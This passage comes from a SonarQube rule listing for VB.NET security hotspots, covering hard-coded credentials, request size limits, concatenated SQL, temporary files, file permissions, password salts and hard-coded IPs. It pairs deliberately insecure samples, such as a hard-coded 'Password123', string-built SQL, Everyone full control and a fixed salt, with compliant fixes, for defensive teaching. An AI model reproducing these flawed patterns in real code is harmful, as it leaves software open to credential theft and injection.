            log4net.Config.BasicConfigurator.Configure() &#39; Sensitive
            log4net.Config.BasicConfigurator.Configure(appender) &#39; Sensitive
            log4net.Config.BasicConfigurator.Configure(appenders) &#39; Sensitive
            log4net.Config.BasicConfigurator.Configure(repository) &#39; Sensitive
            log4net.Config.BasicConfigurator.Configure(repository, appender) &#39; Sensitive
            log4net.Config.BasicConfigurator.Configure(repository, appenders) &#39; Sensitive
        End Sub
    End Class
End Namespace
</pre>
<p><strong>NLog</strong>: configure programmatically</p>
<pre>
Namespace Logging
    Class NLogLogging
        Private Sub Foo(ByVal config As NLog.Config.LoggingConfiguration)
            NLog.LogManager.Configuration &#61; config &#39; Sensitive
        End Sub
    End Class
End Namespace
</pre>
<p><strong>Serilog</strong></p>
<pre>
Namespace Logging
    Class SerilogLogging
        Private Sub Foo()
            Dim config As Serilog.LoggerConfiguration &#61; New Serilog.LoggerConfiguration() &#39; Sensitive
        End Sub
    End Class
End Namespace
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/" rel="nofollow">OWASP Top 10 2021 Category A9</a> - Security Logging and
  Monitoring Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring" rel="nofollow">OWASP Top 10 2017 Category A10</a> -
  Insufficient Logging &amp; Monitoring </li><li> <a href="https://cwe.mitre.org/data/definitions/117" rel="nofollow">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li><li> <a href="https://cwe.mitre.org/data/definitions/532" rel="nofollow">MITRE, CWE-532</a> - Information Exposure Through Log Files </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S2068">
              vbnet:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
Dim username As String &#61; &#34;admin&#34;
Dim password As String &#61; &#34;Password123&#34; &#39; Sensitive
Dim usernamePassword As String &#61; &#34;user&#61;admin&amp;password&#61;Password123&#34; &#39; Sensitive
Dim url As String &#61; &#34;scheme://user:Admin123&#64;domain.com&#34; &#39; Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim username As String &#61; &#34;admin&#34;
Dim password As String &#61; GetEncryptedPassword()
Dim usernamePassword As String &#61; String.Format(&#34;user&#61;{0}&amp;password&#61;{1}&#34;, GetEncryptedUsername(), GetEncryptedPassword())
Dim url As String &#61; $&#34;scheme://{username}:{password}&#64;domain.com&#34;

Dim url2 As String&#61; &#34;http://guest:guest&#64;domain.com&#34; &#39; Compliant
Const Password_Property As String &#61; &#34;custom.password&#34; &#39; Compliant
</pre>
<h2>Exceptions</h2>
<ul><li> Issue is not raised when URI username and password are the same. </li><li> Issue is not raised when searched pattern is found in variable name and value. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5693">
              vbnet:S5693
            </a>
          </td>
          <td>
            <details>
              <p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevents DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> size limits are not defined for the different resources of the web application. </li><li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting" rel="nofollow">rate limiting</a> features. </li><li> the web application infrastructure has limited resources. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul><li> lower or equal to 8mb for file uploads. </li><li> lower or equal to 2mb for other requests. </li></ul>  </li></ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<pre>
Imports Microsoft.AspNetCore.Mvc

Public Class MyController
    Inherits Controller

    &lt;HttpPost&gt;
    &lt;DisableRequestSizeLimit&gt; &#39; Sensitive: No size  limit
    &lt;RequestSizeLimit(10000000)&gt; &#39; Sensitive: 10MB is more than the recommended limit of 8MB
    Public Function PostRequest(Model model) As IActionResult
    &#39; ...
    End Function

    &lt;HttpPost&gt;
    &lt;RequestFormLimits(MultipartBodyLengthLimit &#61; 8000000)&gt; &#39; Sensitive: 10MB is more than the recommended limit of 8MB
    Public Function MultipartFormRequest(Model model) As IActionResult
    &#39; ...
    End Function

End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Imports Microsoft.AspNetCore.Mvc

Public Class MyController
    Inherits Controller

    &lt;HttpPost&gt;
    &lt;RequestSizeLimit(8000000)&gt; &#39; Compliant: 8MB
    Public Function PostRequest(Model model) As IActionResult
    &#39; ...
    End Function

    &lt;HttpPost&gt;
    &lt;RequestFormLimits(MultipartBodyLengthLimit &#61; 8000000)&gt; &#39; Compliant: 8MB
    Public Function MultipartFormRequest(Model model) AS IActionResult
    &#39; ...
    End Function

End Class
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html" rel="nofollow">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/770" rel="nofollow">MITRE, CWE-770</a> - Allocation of Resources Without Limits or Throttling </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S2077">
              vbnet:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href="/organizations/sopra-steria/rules?open&#61;vbnet%3AS3649&amp;rule_key&#61;vbnet%3AS3649" rel="nofollow">S3649</a>), the goal is only to highlight complex/formatted queries.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Some parts of the query come from untrusted values (like user inputs). </li><li> The query is repeated/duplicated in other parts of the code. </li><li> The application must support different types of relational databases. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html" rel="nofollow">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li><li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
Public Sub SqlCommands(ByVal connection As SqlConnection, ByVal query As String, ByVal param As String)
    Dim sensitiveQuery As String &#61; String.Concat(query, param)
    command &#61; New SqlCommand(sensitiveQuery) &#39; Sensitive

    command.CommandText &#61; sensitiveQuery &#39; Sensitive

    Dim adapter As SqlDataAdapter
    adapter &#61; New SqlDataAdapter(sensitiveQuery, connection) &#39; Sensitive
End Sub

Public Sub Foo(ByVal context As DbContext, ByVal query As String, ByVal param As String)
    Dim sensitiveQuery As String &#61; String.Concat(query, param)
    context.Database.ExecuteSqlCommand(sensitiveQuery) &#39; Sensitive

    context.Query(Of User)().FromSql(sensitiveQuery) &#39; Sensitive
End Sub
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Sub Foo(ByVal context As DbContext, ByVal value As String)
    context.Database.ExecuteSqlCommand(&#34;SELECT * FROM mytable WHERE mycol&#61;&#64;p0&#34;, value) &#39; Compliant, the query is parameterized
End Sub
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/89" rel="nofollow">MITRE, CWE-89</a> - Improper Neutralization of Special Elements used in an SQL Command
  </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li><li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA" rel="nofollow">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO" rel="nofollow">Potential SQL/JDOQL Injection (JDO)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE" rel="nofollow">Potential SQL/HQL Injection (Hibernate)</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5443">
              vbnet:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451" rel="nofollow">CVE-2012-2451</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838" rel="nofollow">CVE-2015-1838</a> </li></ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code>, <code>TMPDIR</code> and
<code>TEMP</code>.</p>
<ul><li> <code>/tmp</code> </li><li> <code>/var/tmp</code> </li><li> <code>/usr/tmp</code> </li><li> <code>/dev/shm</code> </li><li> <code>/dev/mqueue</code> </li><li> <code>/run/lock</code> </li><li> <code>/var/run/lock</code> </li><li> <code>/Library/Caches</code> </li><li> <code>/Users/Shared</code> </li><li> <code>/private/tmp</code> </li><li> <code>/private/var/tmp</code> </li><li> <code>\Windows\Temp</code> </li><li> <code>\Temp</code> </li><li> <code>\TMP</code> </li><li> <code>%USERPROFILE%\AppData\Local\Temp</code> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Files are read from or written into a publicly writable folder </li><li> The application creates files with predictable names into a publicly writable folder </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Out of the box, .NET is missing secure-by-design APIs to create temporary files. To overcome this, one of the following options can be used:</p>
<ul><li> Use a dedicated sub-folder with tightly controlled permissions </li><li> Created temporary files in a publicly writable folder and make sure:
    <ul><li> Generated filename is unpredictable </li><li> File is readable and writable only by the creating user ID </li><li> File descriptor is not inherited by child processes </li><li> File is destroyed as soon as it is closed </li></ul>  </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
Using Writer As New StreamWriter(&#34;/tmp/f&#34;) &#39; Sensitive
&#39; ...
End Using
</pre>
<pre>
Dim Tmp As String &#61; Environment.GetEnvironmentVariable(&#34;TMP&#34;) &#39; Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim RandomPath &#61; Path.Combine(Path.GetTempPath(), Path.GetRandomFileName())

&#39; Creates a new file with write, non inheritable permissions which is deleted on close.
Using FileStream As New FileStream(RandomPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, 4096, FileOptions.DeleteOnClose)
    Using Writer As New StreamWriter(FileStream) &#39; Sensitive
    &#39; ...
    End Using
End Using
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE, CWE-377</a> - Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE, CWE-379</a> - Creation of Temporary File in Directory with Incorrect Permissions
  </li><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP, Insecure Temporary File</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S5445">
              vbnet:S5445
            </a>
          </td>
          <td>
            <details>
              <p>Temporary files are considered insecurely created when the file existence check is performed separately from the actual file creation. Such a
situation can occur when creating temporary files using normal file handling functions or when using dedicated temporary file handling functions that
are not atomic.</p>
<h2>Why is this an issue?</h2>
<p>Creating temporary files in a non-atomic way introduces race condition issues in the application’s behavior. Indeed, a third party can create a
given file between when the application chooses its name and when it creates it.</p>
<p>In such a situation, the application might use a temporary file that it does not entirely control. In particular, this file’s permissions might be
different than expected. This can lead to trust boundary issues.</p>
<h3>What is the potential impact?</h3>
<p>Attackers with control over a temporary file used by a vulnerable application will be able to modify it in a way that will affect the application’s
logic. By changing this file’s Access Control List or other operating system-level properties, they could prevent the file from being deleted or
emptied. They may also alter the file’s content before or while the application uses it.</p>
<p>Depending on why and how the affected temporary files are used, the exploitation of a race condition in an application can have various
consequences. They can range from sensitive information disclosure to more serious application or hosting infrastructure compromise.</p>
<h4>Information disclosure</h4>
<p>Because attackers can control the permissions set on temporary files and prevent their removal, they can read what the application stores in them.
This might be especially critical if this information is sensitive.</p>
<p>For example, an application might use temporary files to store users&#39; session-related information. In such a case, attackers controlling those
files can access session-stored information. This might allow them to take over authenticated users&#39; identities and entitlements.</p>
<h4>Attack surface extension</h4>
<p>An application might use temporary files to store technical data for further reuse or as a communication channel between multiple components. In
that case, it might consider those files part of the trust boundaries and use their content without additional security validation or sanitation. In
such a case, an attacker controlling the file content might use it as an attack vector for further compromise.</p>
<p>For example, an application might store serialized data in temporary files for later use. In such a case, attackers controlling those files&#39;
content can change it in a way that will lead to an insecure deserialization exploitation. It might allow them to execute arbitrary code on the
application hosting server and take it over.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code example is vulnerable to a race condition attack because it creates a temporary file using an unsafe API function.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
Imports System.IO

Sub Example()
    Dim TempPath &#61; Path.GetTempFileName() &#39;Noncompliant

    Using Writer As New StreamWriter(TempPath)
        Writer.WriteLine(&#34;content&#34;)
    End Using
End Sub
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
Imports System.IO

Sub Example()
    Dim RandomPath &#61; Path.Combine(Path.GetTempPath(), Path.GetRandomFileName())

    Using FileStream As New FileStream(RandomPath, FileMode.CreateNew, FileAccess.Write, FileShare.None, 4096, FileOptions.DeleteOnClose)
        Using Writer As New StreamWriter(FileStream)
            Writer.WriteLine(&#34;content&#34;)
        End Using
    End Using
End Sub
</pre>
<h3>How does this work?</h3>
<p>Applications should create temporary files so that no third party can read or modify their content. It requires that the files&#39; name, location, and
permissions are carefully chosen and set. This can be achieved in multiple ways depending on the applications&#39; technology stacks.</p>
<h4>Strong security controls</h4>
<p>Temporary files can be created using unsafe functions and API as long as strong security controls are applied. Non-temporary file-handling
functions and APIs can also be used for that purpose.</p>
<p>In general, applications should ensure that attackers can not create a file before them. This turns into the following requirements when creating
the files:</p>
<ul><li> Files should be created in a non-public directory. </li><li> File names should be unique. </li><li> File names should be unpredictable. They should be generated using a cryptographically secure random generator. </li><li> File creation should fail if a target file already exists. </li></ul>
<p>Moreover, when possible, it is recommended that applications destroy temporary files after they have finished using them.</p>
<p>Here the example compliant code uses the <code>Path.GetTempPath</code> and <code>Path.GetRandomFileName</code> functions to generate a unique
random file name. The file is then open with the <code>FileMode.CreateNew</code> option that will ensure the creation fails if the file already
exists. The <code>FileShare.None</code> option will additionally prevent the file from being opened again by any process. To finish, this code ensures
the file will get destroyed once the application has finished using it with the <code>FileOptions.DeleteOnClose</code> option.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File" rel="nofollow">OWASP</a> - Insecure Temporary File </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP</a> - Top 10 2021 - A01:2021 - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities" rel="nofollow">OWASP</a> - Top 10 2017 - A9:2017 -
  Using Components with Known Vulnerabilities </li><li> <a href="https://cwe.mitre.org/data/definitions/377" rel="nofollow">MITRE</a> - CWE-377: Insecure Temporary File </li><li> <a href="https://cwe.mitre.org/data/definitions/379" rel="nofollow">MITRE</a> - CWE-379: Creation of Temporary File in Directory with Incorrect Permissions
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S2612">
              vbnet:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix, &#34;others&#34; class refers to all users except the owner of the file and the members of the group assigned to this file.</p>
<p>In Windows, &#34;Everyone&#34; group is similar and includes all members of the Authenticated Users group as well as the built-in Guest account, and
several other built-in security accounts.</p>
<p>Granting permissions to these groups can lead to unintended access to files.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application is designed to be run on a multi-user environment. </li><li> Corresponding files and directories may contain confidential information. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<h2>Sensitive Code Example</h2>
<p>.Net Framework:</p>
<pre>
Dim unsafeAccessRule &#61; new FileSystemAccessRule(&#34;Everyone&#34;, FileSystemRights.FullControl, AccessControlType.Allow)

Dim fileSecurity &#61; File.GetAccessControl(&#34;path&#34;)
fileSecurity.AddAccessRule(unsafeAccessRule) &#39; Sensitive
fileSecurity.SetAccessRule(unsafeAccessRule) &#39; Sensitive
File.SetAccessControl(&#34;fileName&#34;, fileSecurity)
</pre>
<p>.Net / .Net Core</p>
<pre>
Dim fileInfo &#61; new FileInfo(&#34;path&#34;)
Dim fileSecurity &#61; fileInfo.GetAccessControl()

fileSecurity.AddAccessRule(new FileSystemAccessRule(&#34;Everyone&#34;, FileSystemRights.Write, AccessControlType.Allow)) &#39; Sensitive
fileInfo.SetAccessControl(fileSecurity)
</pre>
<p>.Net / .Net Core using Mono.Posix.NETStandard</p>
<pre>
Dim fileSystemEntry &#61; UnixFileSystemInfo.GetFileSystemEntry(&#34;path&#34;)
fileSystemEntry.FileAccessPermissions &#61; FileAccessPermissions.OtherReadWriteExecute &#39; Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>.Net Framework</p>
<pre>
Dim safeAccessRule &#61; new FileSystemAccessRule(&#34;Everyone&#34;, FileSystemRights.FullControl, AccessControlType.Deny)

Dim fileSecurity &#61; File.GetAccessControl(&#34;path&#34;)
fileSecurity.AddAccessRule(safeAccessRule)
File.SetAccessControl(&#34;path&#34;, fileSecurity)
</pre>
<p>.Net / .Net Core</p>
<pre>
Dim safeAccessRule &#61; new FileSystemAccessRule(&#34;Everyone&#34;, FileSystemRights.FullControl, AccessControlType.Deny)

Dim fileInfo &#61; new FileInfo(&#34;path&#34;)
Dim fileSecurity &#61; fileInfo.GetAccessControl()
fileSecurity.SetAccessRule(safeAccessRule)
fileInfo.SetAccessControl(fileSecurity)
</pre>
<p>.Net / .Net Core using Mono.Posix.NETStandard</p>
<pre>
Dim fs &#61; UnixFileSystemInfo.GetFileSystemEntry(&#34;path&#34;)
fs.FileAccessPermissions &#61; FileAccessPermissions.UserExecute
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission" rel="nofollow">OWASP File Permission</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S2053">
              vbnet:S2053
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability increases the likelihood that attackers are able to compute the cleartext of password hashes.</p>
<h2>Why is this an issue?</h2>
<p>During the process of password hashing, an additional component, known as a &#34;salt,&#34; is often integrated to bolster the overall security. This salt,
acting as a defensive measure, primarily wards off certain types of attacks that leverage pre-computed tables to crack passwords.</p>
<p>However, potential risks emerge when the salt is deemed insecure. This can occur when the salt is consistently the same across all users or when it
is too short or predictable. In scenarios where users share the same password and salt, their password hashes will inevitably mirror each other.
Similarly, a short salt heightens the probability of multiple users unintentionally having identical salts, which can potentially lead to identical
password hashes. These identical hashes streamline the process for potential attackers to recover clear-text passwords. Thus, the emphasis on
implementing secure, unique, and sufficiently lengthy salts in password-hashing functions is vital.</p>
<h3>What is the potential impact?</h3>
<p>Despite best efforts, even well-guarded systems might have vulnerabilities that could allow an attacker to gain access to the hashed passwords.
This could be due to software vulnerabilities, insider threats, or even successful phishing attempts that give attackers the access they need.</p>
<p>Once the attacker has these hashes, they will likely attempt to crack them using a couple of methods. One is brute force, which entails trying
every possible combination until the correct password is found. While this can be time-consuming, having the same salt for all users or a short salt
can make the task significantly easier and faster.</p>
<p>If multiple users have the same password and the same salt, their password hashes would be identical. This means that if an attacker successfully
cracks one hash, they have effectively cracked all identical ones, granting them access to multiple accounts at once.</p>
<p>A short salt, while less critical than a shared one, still increases the odds of different users having the same salt. This might create clusters
of password hashes with identical salt that can then be attacked as explained before.</p>
<p>With short salts, the probability of a collision between two users&#39; passwords and salts couple might be low depending on the salt size. The shorter
the salt, the higher the collision probability. In any case, using longer, cryptographically secure salt should be preferred.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<p>The following code contains examples of hard-coded salts.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
Imports System.Security.Cryptography

Public Sub Hash(Password As String)
    Dim Salt As Byte() &#61; Encoding.UTF8.GetBytes(&#34;salty&#34;)
    Dim Hashed As New Rfc2898DeriveBytes(Password, Salt) &#39; Noncompliant
End Sub
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
Imports System.Security.Cryptography

Public Sub Hash(Password As String)
    Dim Hashed As New Rfc2898DeriveBytes(Password, 64)
End Sub
</pre>
<h3>How does this work?</h3>
<p>This code ensures that each user’s password has a unique salt value associated with it. It generates a salt randomly and with a length that
provides the required security level. It uses a salt length of at least 16 bytes (128 bits), as recommended by industry standards.</p>
<p>In the case of the code sample, the class automatically takes care of generating a secure salt if none is specified.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP</a> Top 10:2021 A02:2021 - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP</a> - Top 10 2017 - A03:2017 - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/759" rel="nofollow">CWE</a> - CWE-759: Use of a One-Way Hash without a Salt </li><li> <a href="https://cwe.mitre.org/data/definitions/760" rel="nofollow">CWE</a> - CWE-760: Use of a One-Way Hash with a Predictable Salt </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=vbnet:S1313">
              vbnet:S1313
            </a>
          </td>
          <td>
            <details>
              <p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
Dim ip &#61; &#34;192.168.12.42&#34; &#39; Sensitive
Dim address &#61; IPAddress.Parse(ip)
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim ip &#61; ConfigurationManager.AppSettings(&#34;myapplication.ip&#34;) &#39; Compliant
Dim address &#61; IPAddress.Parse(ip)
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
